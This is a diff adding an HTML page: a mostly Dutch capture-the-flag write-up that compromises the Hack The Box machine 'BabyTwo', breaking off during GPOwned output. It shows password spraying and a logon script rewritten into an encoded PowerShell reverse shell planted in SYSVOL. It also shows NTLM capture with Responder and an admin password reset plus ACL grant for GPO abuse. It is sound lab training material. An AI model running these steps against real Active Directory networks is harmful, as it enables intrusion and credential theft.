@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Delegate] └─$ nmap 10.129.38.251 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-12 16:59 CET Nmap scan report for 10.129.38.251 Host is up (0.42s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 5985/tcp open wsman Detailed port scan At the detailed port scan go to get more information from the host.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-babytwo/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Delegate] └─$ nmap 10.129.38.251 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-12 16:59 CET Nmap scan report for 10.129.38.251 Host is up (0.42s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 5985/tcp open wsman Detailed port scan At the detailed port scan go to get more information from the host.">
+  <meta itemprop="wordCount" content="2678">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Delegate] └─$ nmap 10.129.38.251 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-12 16:59 CET Nmap scan report for 10.129.38.251 Host is up (0.42s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 5985/tcp open wsman Detailed port scan At the detailed port scan go to get more information from the host.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-babytwo/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Delegate]
+└─$ nmap 10.129.38.251    
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-12 16:59 CET
+Nmap scan report for 10.129.38.251
+Host is up (0.42s latency).
+Not shown: 987 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the detailed port scan go to get more information from the host.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/BabyTwo]
+└─$ nmap -p53,88,135,139,389,445,464,593,636,3389 -sCV 10.129.234.72               
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-13 20:02 CET
+Nmap scan report for 10.129.234.72
+Host is up (0.063s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-13 19:02:26Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
+| Not valid before: 2025-08-19T14:22:11
+|_Not valid after:  2105-08-19T14:22:11
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
+| Not valid before: 2025-08-19T14:22:11
+|_Not valid after:  2105-08-19T14:22:11
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: BABY2
+|   NetBIOS_Domain_Name: BABY2
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: baby2.vl
+|   DNS_Computer_Name: dc.baby2.vl
+|   DNS_Tree_Name: baby2.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-01-13T19:02:33+00:00
+|_ssl-date: 2026-01-13T19:03:13+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=dc.baby2.vl
+| Not valid before: 2025-08-18T14:29:57
+|_Not valid after:  2026-02-17T14:29:57
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2026-01-13T19:02:35
+|_  start_date: N/A
+</code></pre><p>Deze box geeft niet veel meer weg. We hebben geen user credentials van HTB gekregen dus zal ik een andere manier moeten zoeken. Hierbij kan je zien dat de smb poort openstaat. Ik ben dus als eerst een keer gaan kijken of dat er met de user anonymous iets speciaals kon gezien worden op de smb server. Zoals je hieronder zult kunnen zien hebben we read en write rechten op de homes shared drive.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/BabyTwo]
+└─$ smbmap -H 10.129.234.72 -u anonymous 
+
+[+] IP: 10.129.234.72:445       Name: baby2.vl                  Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        apps                                                    READ ONLY
+        C$                                                      NO ACCESS       Default share
+        docs                                                    NO ACCESS
+        homes                                                   READ, WRITE
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  NO ACCESS       Logon server share 
+</code></pre><p>Ik zal dus nu eens gaan kijken wat we op de homes drive te zien krijgen. Ik zal dit gaan doen door gebruik te maken van de smbclient tool.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/BabyTwo]
+└─$ smbclient \\\\10.129.234.72\\homes -U anonymous 
+Password for [WORKGROUP\anonymous]:
+Try &#34;help&#34; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Tue Jan 13 20:05:32 2026
+  ..                                  D        0  Tue Aug 22 22:10:21 2023
+  Amelia.Griffiths                    D        0  Tue Aug 22 22:17:06 2023
+  Carl.Moore                          D        0  Tue Aug 22 22:17:06 2023
+  Harry.Shaw                          D        0  Tue Aug 22 22:17:06 2023
+  Joan.Jennings                       D        0  Tue Aug 22 22:17:06 2023
+  Joel.Hurst                          D        0  Tue Aug 22 22:17:06 2023
+  Kieran.Mitchell                     D        0  Tue Aug 22 22:17:06 2023
+  library                             D        0  Tue Aug 22 22:22:47 2023
+  Lynda.Bailey                        D        0  Tue Aug 22 22:17:06 2023
+  Mohammed.Harris                     D        0  Tue Aug 22 22:17:06 2023
+  Nicola.Lamb                         D        0  Tue Aug 22 22:17:06 2023
+  Ryan.Jenkins                        D        0  Tue Aug 22 22:17:06 2023
+
+                6126847 blocks of size 4096. 1091338 blocks available
+</code></pre><p>Zoals je hierboven kunt zien staat er niets in de directories. Ik ben dus gaan kijken of ik geen interessante informatie in de Netlogon kon vinden. En yes, daar heb ik iets interessant gevonden. Binnen de netlogon drive kan je zien dat er een login.vbs file staat. Ik zal deze naar mijn eigen machine downloaden en kijken wat voor file het is en wat er in staat. Je kan zien dat de file een VBscript file is. Dit soort files wordt uitgevoerd door een Windows Script Host (WSH).</p>
+<pre tabindex="0"><code>smb: \&gt; get login.vbs
+getting file \login.vbs of size 992 as login.vbs (7.8 KiloBytes/sec) (average 7.8 KiloBytes/sec)
+</code></pre><p>Nu dat de file is gedownload naar mijn eigen machine en zal ik eens kijken naar wat er in het bestand staat.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/BabyTwo]
+└─$ cat login.vbs 
+Sub MapNetworkShare(sharePath, driveLetter)
+    Dim objNetwork
+    Set objNetwork = CreateObject(&#34;WScript.Network&#34;)    
+  
+    &#39; Check if the drive is already mapped
+    Dim mappedDrives
+    Set mappedDrives = objNetwork.EnumNetworkDrives
+    Dim isMapped
+    isMapped = False
+    For i = 0 To mappedDrives.Count - 1 Step 2
+        If UCase(mappedDrives.Item(i)) = UCase(driveLetter &amp; &#34;:&#34;) Then
+            isMapped = True
+            Exit For
+        End If
+    Next
+    
+    If isMapped Then
+        objNetwork.RemoveNetworkDrive driveLetter &amp; &#34;:&#34;, True, True
+    End If
+    
+    objNetwork.MapNetworkDrive driveLetter &amp; &#34;:&#34;, sharePath
+    
+    If Err.Number = 0 Then
+        WScript.Echo &#34;Mapped &#34; &amp; driveLetter &amp; &#34;: to &#34; &amp; sharePath
+    Else
+        WScript.Echo &#34;Failed to map &#34; &amp; driveLetter &amp; &#34;: &#34; &amp; Err.Description
+    End If
+    
+    Set objNetwork = Nothing
+End Sub
+
+MapNetworkShare &#34;\\dc.baby2.vl\apps&#34;, &#34;V&#34;
+MapNetworkShare &#34;\\dc.baby2.vl\docs&#34;, &#34;L&#34;   
+</code></pre><p>Maar zoals je zelf kunt zien, is er hier ook niet meer informatie wat we eruit kunnen krijgen. Zoals je kan zien is er ook een apps drive waarop we de leesrechten hebben. Ik zal eens gaan kijken op de drive of er daar geen andere information op staat. En zoals je hieronder kan zien heb ik een <code>login.vbs.lnk</code> en <code>CHANGELOG</code> file gevonden. Ik zal deze gaan downloaden en kijken wat we kunnen vinden van nieuwe informatie.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/BabyTwo]
+└─$ smbclient \\\\10.129.234.72\\apps -U anonymous
+Password for [WORKGROUP\anonymous]:
+Try &#34;help&#34; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Thu Sep  7 21:12:59 2023
+  ..                                  D        0  Tue Aug 22 22:10:21 2023
+  dev                                 D        0  Thu Sep  7 21:13:50 2023
+
+                6126847 blocks of size 4096. 1380013 blocks available
+smb: \&gt; cd dev\
+smb: \dev\&gt; ls
+  .                                   D        0  Thu Sep  7 21:13:50 2023
+  ..                                  D        0  Thu Sep  7 21:12:59 2023
+  CHANGELOG                           A      108  Thu Sep  7 21:16:15 2023
+  login.vbs.lnk                       A     1800  Thu Sep  7 21:13:23 2023
+cd
+                6126847 blocks of size 4096. 1380357 blocks available
+smb: \dev\&gt; get login.vbs.lnk
+getting file \dev\login.vbs.lnk of size 1800 as login.vbs.lnk (9.5 KiloBytes/sec) (average 9.5 KiloBytes/sec)
+smb: \dev\&gt; get CHANGELOG
+getting file \dev\CHANGELOG of size 108 as CHANGELOG (0.8 KiloBytes/sec) (average 5.9 KiloBytes/sec)
+</code></pre><p>Zoals je kan zien is er hier ook geen andere informatie dat interessant kan zijn. De enigste oplossing is voor eens te gaan uittesten de users hetzelfde password als hun users gebruikt hebben. Ik ben dus de users allemaal in een file gaan zetten en door gebruik te maken van de netexec tool kan je Hieronder zien dat er 2 correct gevonden user credentials gevonden zijn.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/BabyTwo]
+└─$ cat users.txt 
+Amelia.Griffiths
+Carl.Moore
+Harry.Shaw
+Joan.Jennings
+Joel.Hurst
+Kieran.Mitchell
+Lynda.Bailey
+Mohammed.Harris
+Nicola.Lamb
+Ryan.Jenkins
+library
+
+┌──(kali㉿kali)-[~/HTB/BabyTwo]
+└─$ netexec smb baby2.vl -u users.txt -p users.txt --continue-on-success | grep &#34;\[+\]&#34;
+SMB                      10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
+SMB                      10.129.234.72   445    DC               [+] baby2.vl\library:library 
+
+┌─[eu-dedivip-2]─[10.10.15.63]─[hackthekat123@htb-bhtrrp7biz]─[~]  
+└──╼ [★]$ nxc smb baby2.vl -u library -p library --shares   
+SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)  
+SMB         10.129.234.72   445    DC               [+] baby2.vl\library:library  
+SMB         10.129.234.72   445    DC               [*] Enumerated shares  
+SMB         10.129.234.72   445    DC               Share           Permissions     Remark  
+SMB         10.129.234.72   445    DC               -----           -----------     ------  
+SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin  
+SMB         10.129.234.72   445    DC               apps            READ,WRITE  
+SMB         10.129.234.72   445    DC               C$                              Default share  
+SMB         10.129.234.72   445    DC               docs            READ,WRITE  
+SMB         10.129.234.72   445    DC               homes           READ,WRITE  
+SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC  
+SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share  
+SMB         10.129.234.72   445    DC               SYSVOL          READ            Logon server share  
+
+┌─[eu-dedivip-2]─[10.10.15.63]─[hackthekat123@htb-bhtrrp7biz]─[~]  
+└──╼ [★]$ nxc smb baby2.vl -u Carl.Moore -p Carl.Moore --shares  
+SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)  
+SMB         10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore  
+SMB         10.129.234.72   445    DC               [*] Enumerated shares  
+SMB         10.129.234.72   445    DC               Share           Permissions     Remark  
+SMB         10.129.234.72   445    DC               -----           -----------     ------  
+SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin  
+SMB         10.129.234.72   445    DC               apps            READ,WRITE  
+SMB         10.129.234.72   445    DC               C$                              Default share  
+SMB         10.129.234.72   445    DC               docs            READ,WRITE  
+SMB         10.129.234.72   445    DC               homes           READ,WRITE  
+SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC  
+SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share  
+SMB         10.129.234.72   445    DC               SYSVOL          READ            Logon server share
+</code></pre><p>Met deze gegevens ik gaan proberen kijken of ik niet een connectie met de smb server kan maken en dit was met success gelukt success. voor alleer ik verder ga, zal ik met de user de gegevens informatie van de ldap server gaan halen. Dit ben ik gaan doen door gebruik te maken van de volgende tool <code>nxc</code></p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/BabyTwo]
+└─$ nxc ldap 10.129.234.72 -u &#39;Carl.Moore&#39; -p &#39;Carl.Moore&#39; --bloodhound --collection All --dns-server 10.129.234.72
+LDAP        10.129.234.72   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)
+LDAP        10.129.234.72   389    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
+LDAP        10.129.234.72   389    DC               Resolved collection methods: container, psremote, objectprops, dcom, acl, localadmin, rdp, session, trusts, group                                                                 
+LDAP        10.129.234.72   389    DC               Done in 00M 07S
+LDAP        10.129.234.72   389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.129.234.72_2026-01-13_211523_bloodhound.zip 
+</code></pre><p>Nu dat dit gebeurd is ben ik de zip file gaan uploaden op bloodhound maar er was geen path te vinden die ik verder kon gebruiken. Dus ik ben het login.vbs bestand gaan aanpassen en er een revshell van gaan maken. Dit zodat ik inlog met de user <code>Carl.Moore</code> of <code>library</code> op de SYSVOL shared drive, ik het bestand dat er al opstond kan verwijderen en het nieuwe bestand erop kan zetten. Door mijn listener optestarten ben ik tot de connectie naar de windows machine geraakt.
+Ik heb de file aangepast naar het volgende:
+<a href="https://www.revshells.com/">https://www.revshells.com/</a></p>
+<pre tabindex="0"><code>cat login.vbs  
+Sub MapNetworkShare(sharePath, driveLetter)  
+    Dim objNetwork  
+    Set objNetwork = CreateObject(&#34;WScript.Network&#34;)      
+  
+    &#39; Check if the drive is already mapped  
+    Dim mappedDrives  
+    Set mappedDrives = objNetwork.EnumNetworkDrives  
+    Dim isMapped  
+    isMapped = False  
+    For i = 0 To mappedDrives.Count - 1 Step 2  
+        If UCase(mappedDrives.Item(i)) = UCase(driveLetter &amp; &#34;:&#34;) Then  
+            isMapped = True  
+            Exit For  
+        End If  
+    Next  
+  
+    If isMapped Then  
+        objNetwork.RemoveNetworkDrive driveLetter &amp; &#34;:&#34;, True, True  
+    End If  
+  
+    objNetwork.MapNetworkDrive driveLetter &amp; &#34;:&#34;, sharePath  
+  
+    If Err.Number = 0 Then  
+        WScript.Echo &#34;Mapped &#34; &amp; driveLetter &amp; &#34;: to &#34; &amp; sharePath  
+    Else  
+        WScript.Echo &#34;Failed to map &#34; &amp; driveLetter &amp; &#34;: &#34; &amp; Err.Description  
+    End If  
+  
+    Set objNetwork = Nothing  
+End Sub
+
+MapNetworkShare &#34;\\dc.baby2.vl\apps&#34;, &#34;V&#34;  
+MapNetworkShare &#34;\\dc.baby2.vl\docs&#34;, &#34;L&#34;  
+Dim objShell  
+Set objShell = CreateObject(&#34;WScript.Shell&#34;)  
+objShell.Run &#34;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA1ADQAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#34; , 0, False  
+Set objShell = Nothing
+</code></pre><p>Achter het aanpassen van de file, ben ik deze gaan uploaden op de server, een listener opgestart en afgewacht tot wanneer de connectie tot stand kwam.</p>
+<pre tabindex="0"><code>─[eu-dedivip-2]─[10.10.15.63]─[hackthekat123@htb-bhtrrp7biz]─[~]  
+└──╼ [★]$ smbclient \\\\baby2.vl\\SYSVOL -U Carl.Moore%Carl.Moore  
+Try &#34;help&#34; to get a list of possible commands.  
+smb: \&gt; ls  
+  .                                   D        0  Tue Aug 22 12:37:36 2023  
+  ..                                  D        0  Tue Aug 22 12:37:36 2023  
+  baby2.vl                           Dr        0  Tue Aug 22 12:37:36 2023
+
+    6126847 blocks of size 4096. 1960001 blocks available  
+smb: \&gt; cd baby2.vl  
+smb: \baby2.vl\&gt; ls  
+  .                                   D        0  Tue Aug 22 12:43:55 2023  
+  ..                                  D        0  Tue Aug 22 12:37:36 2023  
+  DfsrPrivate                      DHSr        0  Tue Aug 22 12:43:55 2023  
+  Policies                            D        0  Tue Aug 22 12:37:41 2023  
+  scripts                             D        0  Mon Aug 25 03:30:39 2025
+
+    6126847 blocks of size 4096. 1960001 blocks available  
+smb: \baby2.vl\&gt; cd scripts  
+smb: \baby2.vl\scripts\&gt; ls  
+  .                                   D        0  Mon Aug 25 03:30:39 2025  
+  ..                                  D        0  Tue Aug 22 12:43:55 2023  
+  login.vbs                           A      992  Sat Sep  2 09:55:51 2023
+
+    6126847 blocks of size 4096. 1960001 blocks available  
+smb: \baby2.vl\scripts\&gt; del login.vbs   
+smb: \baby2.vl\scripts\&gt; put login.vbs  
+putting file login.vbs as \baby2.vl\scripts\login.vbs (65.2 kb/s) (average 65.2 kb/s)
+</code></pre><p>Op de listener kan je zien dat ik de connectie heb gemaakt naar de windows machine.</p>
+<pre tabindex="0"><code>┌─[eu-dedivip-2]─[10.10.15.63]─[hackthekat123@htb-3pszu1yqrz]─[~]  
+└──╼ [★]$ nc -lvnp 9001  
+listening on [any] 9001 ...  
+connect to [10.10.15.63] from (UNKNOWN) [10.129.234.72] 50673
+</code></pre><p>Ik ben gaan kijken met welke user de connectie gemaakt is geweest en daar kan je zien dat ik de user Amelia ben. Ik ben dan gaan zoeken naar de user flag en heb deze gevonden niet op de normale plaats maar het stond gewoon in de <code>C:\</code> drive.</p>
+<pre tabindex="0"><code>PS C:\Users&gt; whoami  
+baby2\amelia.griffiths
+
+PS C:\Users&gt; cd ..  
+PS C:\&gt; ls
+
+    Directory: C:\
+
+Mode                 LastWriteTime         Length Name                                                                   
+----                 -------------         ------ ----                                                                   
+d-----         4/16/2025   2:27 AM                inetpub                                                                
+d-----          5/8/2021   1:20 AM                PerfLogs                                                               
+d-r---         4/16/2025   1:51 AM                Program Files                                                          
+d-----         8/22/2023  10:30 AM                Program Files (x86)                                                    
+d-----         8/22/2023   1:10 PM                shares                                                                 
+d-----         8/22/2023  12:35 PM                temp                                                                   
+d-r---         8/22/2023  12:54 PM                Users                                                                  
+d-----         8/20/2025   9:05 AM                Windows                                                                
+-a----         4/16/2025   2:48 AM             32 user.txt                                                             
+
+PS C:\&gt; cat user.txt  
+42783b2c1483aeb70eca6810f0645c38
+</code></pre><p>ntlm hash capturing gaan doen. Hieraan zal je kunnen zien dat het een ntlmv1 hash is en deze niet gemakkelijk zijn voor te cracken. Je zal deze eerst naar de standaard ntlm moeten omzetten voor het cracken van de hash. Hieronder laat ik de stappen zien dat je kan gebruiken voor de NTLM hash te krijgen. We zijn nog steeds ingeloged met de user amelia.griffiths, We gaan op een andere terminal een responder openen. Daarop zal je de ntlm hash krijgen. Je kan de onderstaande commando&rsquo;s doen.</p>
+<p>Connectie met amelia.griffiths</p>
+<pre tabindex="0"><code>whoami
+baby2\amelia.griffiths
+PS C:\Windows\system32&gt; net use \\10.10.16.154\share
+</code></pre><p>Responder</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/BabyTwo]
+└─$ sudo responder -I tun0
+
+[SMB] NTLMv1-SSP Hash     : Amelia.Griffiths::BABY2:6D884DE3BF10003000000000000000000000000000000000:7E5EEEF5DE5D649574C9D42015571A7C3BF60115F8B98352:2532e99d6c6defe8
+</code></pre><p>Ik zal nu deze proberen converteren naar een normale hash. Maar dit heeft naar een dood path geleid. Er blijven errors opkomen en je kan de hash niet cracken. Ik ben dan eens gaan kijken naar het shortest path to domain admins. Hieronder kan je het path zien.</p>
+<p>![[Pasted image 20260115201232.png]]</p>
+<p>Wat ik dus zal moeten doen is het password van de <code>gpoadm</code> user aanpassen. Eens dat het password is aangepast, zal ik het object gaan toevoegen aan het domain. Eens dat dit gedaan is kunnen we de GPO gaan abuse, hiervoor zal je het gpo-id nodig hebben. Voor dit te vinden ben ik gebruik gaan maken van de volgende tool: <a href="https://github.com/X-C3LL/GPOwned">https://github.com/X-C3LL/GPOwned</a>
+Daar zal je de gpo id kunnen vinden en ben ik de gpoabuse gaan starten. Binnen de gpo abuse zal je door gebruik te maken van een command je eigen kunnen toevoegen aan de administrators groep waardoor je erna een connectie zal kunnen maken met de machine door gpoadm te gebruiken die de admin rechten heeft. Ik ben de gpo abuse gaan doen door gebruik te maken van de volgende tool: <a href="https://github.com/Hackndo/pyGPOAbuse">https://github.com/Hackndo/pyGPOAbuse</a></p>
+<h3 id="change-gpoadm-password-and-add-domainobjectacl">Change gpoadm password and add DomainObjectACL</h3>
+<pre tabindex="0"><code>$UserPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainTect -Force
+PS C:\temp&gt; Set-DomainUserPassword -Identity gpoadm -AccountPassword $UserPassword
+PS C:\temp&gt; Add-DomainObjectAcl -TargetIdentity &#34;gpoadm&#34; -PrincipalIdentity amelia.griffiths -Domain baby2.vl -Rights All -Verbose
+</code></pre><h3 id="retrieving-gpo-id">Retrieving gpo id</h3>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/BabyTwo]
+└─$ python3 GPOwned.py -u gpoadm -p &#39;Password123!&#39; -d baby2.vl -dc-ip 10.129.234.72 -gpcmachine -listgpo
+                GPO Helper - @TheXC3LL
+                Modifications by - @Fabrizzio53
+
+
+[*] Connecting to LDAP service at 10.129.234.72
+[*] Requesting GPOs info from LDAP
+
